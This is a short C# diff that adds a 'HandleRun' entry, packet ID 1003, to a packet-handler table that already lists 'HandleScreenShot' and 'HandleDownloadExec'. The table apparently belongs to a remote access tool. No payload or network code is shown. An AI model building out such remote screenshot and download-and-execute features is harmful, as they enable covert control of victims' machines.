@@ -25,6 +25,9 @@
         {
             this.clientPacketIds.Add(1001, new HandleScreenShot());
             this.clientPacketIds.Add(1002, new HandleDownloadExec());
+            this.clientPacketIds.Add(1003, new HandleRun());
+
+
         }
 
         public void Handle(int packetId, object receivedClass, ServerSocket serverSocket)
